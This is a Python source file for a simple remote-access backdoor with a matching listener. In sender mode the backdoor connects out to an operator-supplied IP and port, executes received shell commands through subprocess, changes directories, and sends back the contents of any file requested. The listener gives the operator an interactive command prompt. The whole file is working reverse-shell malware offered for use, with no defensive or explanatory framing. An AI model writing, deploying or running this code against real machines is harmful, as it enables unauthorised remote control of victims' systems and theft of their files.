import optparse, socket, subprocess, json, os


class Sender_N_Receiver:

    def __init__(self, ip, port, mode):
        self.ip = ip
        self.port = int(port)
        self.backd = self.backdoor
        self.listn = self.listener
        if mode == "S":
            self.backd(self.ip, self.port)
        elif mode == "R":
            self.listn(self.ip, self.port)

    class backdoor():

        def __init__(self, ip, port):
            self.status = True
            self.ip = ip
            self.port = port
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.ip, self.port))
            self.make_connection()

        def reliable_send(self, data):
            json_data = json.dumps(data.decode('utf-8'))
            self.connection.send(bytes(json_data, 'utf-8'))

        def reliable_recieve(self):
            result = self.connection.recv(1024)
            return json.loads(result)

        def execute_commands(self, command_given):
            try:
                return subprocess.check_output(command_given, shell=True)
            except Exception:
                return b"[-]invaid command"

        def change_working_directory(self, path):
            os.chdir(path)
            return b"[+]changing working directory to "+bytes(path, 'utf-8')

        def read_files(self, path):
            with open(path, "rb") as file:
                return file.read()

        def make_connection(self):
            output = ""
            while self.status:
                command = self.reliable_recieve()
                if command[0] == "close":
                    self.status = False
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    output = self.change_working_directory(command[1])
                elif command[0] == "download":
                    output = self.read_files(command[1])
                else:
                    output = self.execute_commands(command)
                self.reliable_send(output)

    class listener():

        def __init__(self, ip, port):
            self.status = True
            self.ip = ip
            self.port = port
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((self.ip, self.port))
            listener.listen(0)
            print("[+]waiting for connections...")
            self.connection, self.address = listener.accept()
            print("[+]got connection from " + str(self.address))
            self.listener_start()

        def reliable_send(self, data):
            if data[0] == "close":
                json_data = json.dumps(data)
                self.connection.send(bytes(json_data, 'utf-8'))
                self.connection.close()
                exit()
            elif data[0] == "download":
                data = self.read_files(data[1])
            json_data = json.dumps(data)
            self.connection.send(bytes(json_data, 'utf-8'))

        def reliable_recieve(self):
            result = b''
            while True:
                try:
                    result = result + self.connection.recv(1024)
                    return json.loads(result)
                except json.decoder.JSONDecodeError:
                    continue

        def read_files(self, path):
            with open(path, "rb") as file:
                return file.read()

        def listener_start(self):
            while True:
                command = input(">> ")
                command = command.split(" ")
                self.reliable_send(command)
                result = self.reliable_recieve()
                print("\n" + result)


def get_arguments():
    arguments = optparse.OptionParser()
    arguments.add_option("-i", "--ip", metavar='\b', dest="ip", help="\tip-address")
    arguments.add_option("-p", "--port", metavar='\b', dest="port", help="\tport")
    arguments.add_option("-m", "--mode", metavar='\b', dest="mode", help="\tmode[ S - send, R - recieve]")
    values, options = arguments.parse_args()
    return values


values = get_arguments()
snr = Sender_N_Receiver(values.ip, values.port, values.mode)
